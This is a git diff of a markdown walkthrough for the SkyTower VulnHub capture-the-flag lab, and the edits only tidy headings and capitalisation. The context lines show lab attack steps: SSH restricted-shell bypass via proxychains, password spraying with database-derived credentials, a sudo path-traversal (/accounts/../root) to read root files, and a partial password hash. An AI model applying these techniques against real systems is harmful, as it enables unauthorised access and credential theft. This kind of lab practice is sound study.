@@ -88,7 +88,7 @@ after the uncommented i added, at the button and i commneted the socksproxyto no
 ![Screenshot From 2025-03-29 04-27-50](https://github.com/user-attachments/assets/17b2be6a-252d-4614-a293-6032880cba34)
 
 
-##Login using ssh
+## Login using ssh
 ```
                                                                                    
 ┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/skytower]
@@ -131,7 +131,7 @@ john
 
 ```
 
-for multiple testing and chatgpt game this and loged me sucessfully
+For multiple testing and chatgpt game this and loged me sucessfully
 
 ```
 ┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/skytower]
@@ -196,7 +196,7 @@ if($db->connect_errno > 0){
 
 
 ```
-lets try and try to spray the passwords
+Lets try and try to spray the passwords
 
 ```
 mysql> show databases;
@@ -240,7 +240,7 @@ mysql>
 
 ```
 
-##spray the password of sara in ssh successed
+## Spray the password of sara in ssh successed
 ```
 ┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/skytower]
 └─$ proxychains ssh -oHostKeyAlgorithms=+ssh-rsa sara@192.168.56.101 -t "bash --noprofile --norc"
@@ -262,7 +262,7 @@ bash-4.2$
 
 
 ```
-#It took me long time to see the rtechnique, the permistion it says
+## It took me long time to see the technique, the permistion it says
  io can go in /accounts/ as root and any other point so i need to pass first into /accounts/ as root and i can go * [ALL] i want so, i listed in root using /accounts/../root >> i go back one step and list the root directory contesnt and i found the flag
 #WTF
 
@@ -297,7 +297,7 @@ william:$6$c3VykdoT$qRUKl1e77skTm0sLHavRSp8mUJfMIPrJBovrXC8o9GY8/P7gpasSbvtqA0rn
 
 
 ```
-#let mee if root has any thing
+## let mee if root has any thing
 
 ```
 
@@ -312,7 +312,7 @@ bash-4.2$
 
 
 ```
-#wow i have root password now i can go more
+## wow i have root password now i can go more
 ```
 ┌──(cyberkid㉿kali)-[~/Desktop/Vulnhub/skytower]
 └─$ proxychains ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.56.101 -t "bash --noprofile --norc"
